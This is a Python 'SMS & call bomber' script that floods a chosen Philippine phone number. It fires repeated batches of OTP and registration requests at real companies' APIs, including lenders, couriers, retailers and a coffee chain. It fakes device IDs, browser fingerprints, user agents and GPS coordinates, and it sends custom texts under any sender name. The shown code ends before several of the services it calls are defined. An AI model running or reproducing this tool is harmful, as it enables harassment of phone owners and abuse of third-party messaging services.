import requests
import random
import string
import time
import json
from datetime import datetime
import os
import sys
import asyncio
import aiohttp
import readline
from urllib.parse import urlencode
from typing import List, Dict, Tuple
 
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    GRAY = '\033[90m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'
 
class UIComponents:
    def header(text):
        width = 60
        print(f"{Colors.CYAN}{Colors.BOLD}╔{'═' * (width - 2)}╗{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}║{text.center(width - 2)}║{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}╚{'═' * (width - 2)}╝{Colors.RESET}")
 
    def subheader(text):
        print(f"\n{Colors.BLUE}{Colors.BOLD}▸ {text}{Colors.RESET}")
 
    def service_status(service, status):
        status_text = f"{Colors.GREEN}SUCCESS{Colors.RESET}" if status else f"{Colors.RED}FAILED{Colors.RESET}"
        symbol = f"{Colors.GREEN}✓{Colors.RESET}" if status else f"{Colors.RED}✗{Colors.RESET}"
        print(f"  {symbol} {service:<20} {status_text}")
 
    def menu_item(number, text):
        print(f"  {Colors.YELLOW}[{number}] {text}{Colors.RESET}")
 
    def stats_box(success, failed, total, target=""):
        print(f"\n{Colors.CYAN}{Colors.BOLD}╔{'═' * 38}╗{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}║           ATTACK STATISTICS         ║{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}╠{'═' * 38}╣{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}║ {Colors.GREEN}✓ Successful: {success:<19} {Colors.CYAN}║{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}║ {Colors.RED}✗ Failed: {failed:<23} {Colors.CYAN}║{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}║ {Colors.WHITE}Total: {total:<26} {Colors.CYAN}║{Colors.RESET}")
        if target:
            print(f"{Colors.CYAN}{Colors.BOLD}║ {Colors.YELLOW}Target: {target:<24} {Colors.CYAN} ║{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}╚{'═' * 38}╝{Colors.RESET}")
 
    @staticmethod
    def batch_header(batch_num, total_batches):
        print(f"\n{Colors.MAGENTA}{Colors.BOLD}🔄 BATCH {batch_num}/{total_batches} {'─' * 30}{Colors.RESET}")
 
def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = rf"""
{Colors.MAGENTA}{Colors.BOLD}
▓█████▄  ██▀███   ▒█████    ██████  ▒█████   ███▄ ▄███▓
▒██▀ ██▌▓██ ▒ ██▒▒██▒  ██▒▒██    ▒ ▒██▒  ██▒▓██▒▀█▀ ██▒
░██   █▌▓██ ░▄█ ▒▒██░  ██▒░ ▓██▄   ▒██░  ██▒▓██    ▓██░
░▓█▄   ▌▒██▀▀█▄  ▒██   ██░  ▒   ██▒▒██   ██░▒██    ▒██ 
░▒████▓ ░██▓ ▒██▒░ ████▓▒░▒██████▒▒░ ████▓▒░▒██▒   ░██▒
 ▒▒▓  ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░   ░  ░
 ░ ▒  ▒   ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░▒  ░ ░  ░ ▒ ▒░ ░  ░      ░
 ░ ░  ░   ░░   ░ ░ ░ ░ ▒  ░  ░  ░  ░ ░ ░ ▒  ░      ░   
   ░       ░         ░ ░        ░      ░ ░         ░   
 ░                                                      
    {Colors.RESET}"""
    print(banner)
    print(f"{Colors.CYAN}{'═' * 65}{Colors.RESET}")
    print(f"{Colors.YELLOW}{Colors.BOLD}      MULTI SMS & CALL BOMBER {Colors.RESET}")
    print(f"{Colors.GREEN}           SOLID BOMBER PRO{Colors.RESET}")
    print(f"{Colors.CYAN}{'═' * 65}{Colors.RESET}\n")
 
def ask(question, color=Colors.CYAN):
    return input(f"{color}{Colors.BOLD}{question} ➜ {Colors.RESET}")
 
def random_string(length):
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))
 
def random_gmail():
    return f"{random_string(8)}@gmail.com"
 
def random_uid():
    return random_string(28)
 
def random_device_id():
    return random_string(16)
 
def normalize_phone_number(phone):
    phone = phone.replace(' ', '')
 
    if phone.startswith('0'):
        return '+63' + phone[1:]
    elif phone.startswith('63') and not phone.startswith('+63'):
        return '+' + phone
    elif not phone.startswith('+63') and len(phone) == 10:
        return '+63' + phone
    elif not phone.startswith('+'):
        return '+63' + phone
 
    return phone
 
FINGERPRINT_VISITOR_ID = "TPt0yCuOFim3N3rzvrL1"
FINGERPRINT_REQUEST_ID = "1757149666261.Rr1VvG"
 
class SMSBomber:
    def __init__(self):
        self.success_count = 0
        self.fail_count = 0
        self.session = requests.Session()
        self.custom_sender_name = "User"
        self.custom_message = "Test Message"
 
    def set_custom_data(self, sender_name="User", message="Test Message"):
        self.custom_sender_name = sender_name
        self.custom_message = message
 
    async def execute_attack(self, number_to_send, amount, selected_services=None):
        if selected_services is None:
            selected_services = self.get_all_services()
 
        UIComponents.header("SMS & CALL")
        print(f"{Colors.CYAN}   Target: {number_to_send}{Colors.RESET}")
        print(f"{Colors.CYAN}   Batches: {amount}{Colors.RESET}")
        print(f"{Colors.CYAN}   Services: {len(selected_services)} selected{Colors.RESET}")
 
        total_services = len(selected_services)
 
        for i in range(1, amount + 1):
            UIComponents.batch_header(i, amount)
 
            tasks = []
            service_names = []
 
            for service_name in selected_services:
                if service_name == "CUSTOM_SMS":
                    tasks.append(self.send_custom_sms(number_to_send))
                    service_names.append("CUSTOM SMS")
                elif service_name == "EZLOAN":
                    tasks.append(self.send_ezloan(number_to_send))
                    service_names.append("EZLOAN")
                elif service_name == "XPRESS":
                    tasks.append(self.send_xpress(number_to_send, i))
                    service_names.append("XPRESS PH")
                elif service_name == "ABENSON":
                    tasks.append(self.send_abenson(number_to_send))
                    service_names.append("ABENSON")
                elif service_name == "EXCELLENT_LENDING":
                    tasks.append(self.send_excellent_lending(number_to_send))
                    service_names.append("EXCELLENT LENDING")
                elif service_name == "FORTUNE_PAY":
                    tasks.append(self.send_fortune_pay(number_to_send))
                    service_names.append("FORTUNE PAY")
                elif service_name == "WEMOVE":
                    tasks.append(self.send_wemove(number_to_send))
                    service_names.append("WEMOVE")
                elif service_name == "LBC":
                    tasks.append(self.send_lbc(number_to_send))
                    service_names.append("LBC CONNECT")
                elif service_name == "PICKUP_COFFEE":
                    tasks.append(self.send_pickup_coffee(number_to_send))
                    service_names.append("PICKUP COFFEE")
                elif service_name == "HONEY_LOAN":
                    tasks.append(self.send_honey_loan(number_to_send))
                    service_names.append("HONEY LOAN")
                elif service_name == "KOMO_PH":
                    tasks.append(self.send_komo_ph(number_to_send))
                    service_names.append("KOMO PH")
                elif service_name == "S5_OTP":
                    tasks.append(self.send_s5_otp(number_to_send))
                    service_names.append("S5.COM")
                elif service_name == "CALL_BOMB":
                    tasks.append(self.send_call_bomb(number_to_send))
                    service_names.append("CALL BOMB")
 
            results = await asyncio.gather(*tasks, return_exceptions=True)
 
            batch_success = 0
            batch_fail = 0
 
            for service_name, result in zip(service_names, results):
                if result is True:
                    self.success_count += 1
                    batch_success += 1
                    UIComponents.service_status(service_name, True)
                else:
                    self.fail_count += 1
                    batch_fail += 1
                    UIComponents.service_status(service_name, False)
 
            print(f"\n{Colors.CYAN}   Batch {i} completed: {Colors.GREEN}{batch_success} success{Colors.RESET} | {Colors.RED}{batch_fail} failed{Colors.RESET}")
 
            if i < amount:
                delay = random.randint(2, 4)
                print(f"{Colors.YELLOW}   Waiting {delay} seconds before next batch...{Colors.RESET}")
                await asyncio.sleep(delay)
 
    async def send_custom_sms(self, number_to_send):
        """Send custom SMS using the m2techtronix service"""
        try:
            normalized_number = normalize_phone_number(number_to_send)
 
            if not normalized_number:
                return False
 
            suffix = '-freed0m'
            credits = '\n\nCreated by: ANTRAX'
            if self.custom_message.endswith(suffix):
                with_suffix = self.custom_message
            else:
                with_suffix = f"{self.custom_message} {suffix}"
            final_text = f"{with_suffix}{credits}"
 
            command_array = [
                'free.text.sms',
                '421',
                normalized_number,
                '2207117BPG',
                'fuT8-dobSdyEFRuwiHrxiz:APA91bHNbeMP4HxJR-eBEAS0lf9fyBPg-HWWd21A9davPtqxmU-J-TTQWf28KXsWnnTnEAoriWq3TFG8Xdcp83C6GrwGka4sTd_6qnlqbfN4gP82YaTgvvg',
                final_text
            ]
 
            headers = {
                'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 15; 2207117BPG Build/AP3A.240905.015.A2)',
                'Connection': 'Keep-Alive',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
 
            data = {
                'UID': random_uid(),
                'humottaee': 'Processing',
                'Email': random_gmail(),
                '$Oj0O%K7zi2j18E': json.dumps(command_array),
                'device_id': random_device_id(),
                'Photo': 'https://lh3.googleusercontent.com/a/ACg8ocJyIdNL-vWOcm_v4Enq2PRZRcNaU_c8Xt0DJ1LNvmtKDiVQ-A=s96-c',
                'Name': self.custom_sender_name
            }
 
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
                async with session.post(
                    'https://sms.m2techtronix.com/v13/sms.php',
                    data=urlencode(data),
                    headers=headers
                ) as response:
                    return True
        except Exception as e:
            return False
 
    async def send_ezloan(self, number_to_send):
        try:
            headers = {
                'User-Agent': 'okhttp/4.9.2',
                'Accept': 'application/json',
                'Content-Type': 'application/json',
            }
 
            data = {
                "businessId": "EZLOAN",
                "contactNumber": number_to_send,
                "appsflyerIdentifier": "1760444943092-3966994042140191452"
            }
 
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
                async with session.post(
                    'https://gateway.ezloancash.ph/security/auth/otp/request',
                    headers=headers,
                    json=data
                ) as response:
                    return True
        except Exception as e:
            return False
 
    async def send_xpress(self, number_to_send, i):
        try:
            formatted_num = self.format_number(number_to_send)
            data = {
                "FirstName": "user",
                "LastName": "test",
                "Email": f"user{int(time.time() * 1000)}_{i}@gmail.com",
                "Phone": formatted_num,
                "Password": "Pass1234",
                "ConfirmPassword": "Pass1234",
                "FingerprintVisitorId": FINGERPRINT_VISITOR_ID,
                "FingerprintRequestId": FINGERPRINT_REQUEST_ID,
            }
 
            headers = {
                "User-Agent": "Dalvik/2.1.0",
                "Content-Type": "application/json",
            }
 
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
                async with session.post(
                    "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
                    headers=headers,
                    json=data
                ) as response:
                    return True
        except Exception:
            return False
 
    async def send_abenson(self, number_to_send):
        try:
            data = {
                "contact_no": number_to_send,
                "login_token": "undefined"
            }
 
            headers = {
                'User-Agent': 'okhttp/4.9.0',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
 
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
                async with session.post(
                    'https://api.mobile.abenson.com/api/public/membership/activate_otp',
                    headers=headers,
                    data=data
                ) as response:
                    return True
        except Exception:
            return False
 
    async def send_excellent_lending(self, number_to_send):
        try:
            coordinates = [
                {"lat": "14.5995", "long": "120.9842"},
                {"lat": "14.6760", "long": "121.0437"},
                {"lat": "14.8648", "long": "121.0418"}
            ]
            user_agents = [
                'okhttp/4.12.0',
                'okhttp/4.9.2',
                'Dart/3.6 (dart:io)',
            ]
 
            coord = random.choice(coordinates)
            agent = random.choice(user_agents)
 
            data = {
                "domain": number_to_send,
                "cat": "login",
                "previous": False,
                "financial": "efe35521e51f924efcad5d61d61072a9"
            }
 
            headers = {
                'User-Agent': agent,
                'Content-Type': 'application/json; charset=utf-8',
                'x-latitude': coord["lat"],
                'x-longitude': coord["long"]
            }
 
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
                async with session.post(
                    'https://api.excellenteralending.com/dllin/union/rehabilitation/dock',
                    headers=headers,
                    json=data
                ) as response:
                    return True
        except Exception:
            return False
 
    async def send_fortune_pay(self, number_to_send):
        try:
            data = {
                "deviceId": "c31a9bc0-652d-11f0-88cf-9d4076456969",
                "deviceType": "GOOGLE_PLAY",
                "companyId": "4bf735e97269421a80b82359e7dc2288",
                "dialCode": "+63",
                "phoneNumber": number_to_send.replace('0', '', 1) if number_to_send.startswith('0') else number_to_send
            }
 
            headers = {
                'User-Agent': 'Dart/3.6 (dart:io)',
                'Content-Type': 'application/json',
                'app-type': 'GOOGLE_PLAY',
                'authorization': 'Bearer',
            }
 
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
                async with session.post(
                    'https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register',
                    headers=headers,
                    json=data
                ) as response:
                    return True
        except Exception:
            return False
 
    async def send_wemove(self, number_to_send):
        try:
            data = {
                "phone_country": "+63",
                "phone_no": number_to_send.replace('0', '', 1) if number_to_send.startswith('0') else number_to_send
            }
 
            headers = {
                'User-Agent': 'okhttp/4.9.3',
                'Content-Type': 'application/json',
                'xuid_type': 'user',
                'source': 'customer',
                'authorization': 'Bearer'
            }
 
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
                async with session.post(
                    'https://api.wemove.com.ph/auth/users',
                    headers=headers,
                    json=data
                ) as response:
                    return True
        except Exception:
            return False
 
    async def send_lbc(self, number_to_send):
        try:
            data = {
                "verification_type": "mobile",
                "client_email": f"{random_string(8)}@gmail.com",
                "client_contact_code": "+63",
                "client_contact_no": number_to_send.replace('0', '', 1) if number_to_send.startswith('0') else number_to_send,
                "app_log_uid": random_string(16),
            }
 
            headers = {
                'User-Agent': 'Dart/2.19 (dart:io)',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
 
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
                async with session.post(
                    'https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification',
                    headers=headers,
                    data=data
                ) as response:
                    return True
        except Exception:
            return False
 
    async def send_pickup_coffee(self, number_to_send):
        try:
            user_agents = ['okhttp/4.12.0', 'okhttp/4.9.2', 'Dart/3.6 (dart:io)']
            formatted_num = self.format_number(number_to_send)
 
            data = {
                "mobile_number": formatted_num,
                "login_method": "mobile_number"
            }
 
            headers = {
                'User-Agent': random.choice(user_agents),
                'Content-Type': 'application/json',
            }
 
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
                async with session.post(
                    'https://production.api.pickup-coffee.net/v2/customers/login',
                    headers=headers,
                    json=data
                ) as response:
                    return True
        except Exception:
            return False
 
    async def send_honey_loan(self, number_to_send):
        try:
            data = {
                "phone": number_to_send,
                "is_rights_block_accepted": 1
            }
 
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 15)',
                'Content-Type': 'application/json',
            }
 
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
                async with session.post(
                    'https://api.honeyloan.ph/api/client/registration/step-one',
                    headers=headers,
                    json=data
                ) as response:
                    return True
        except Exception:
            return False
 
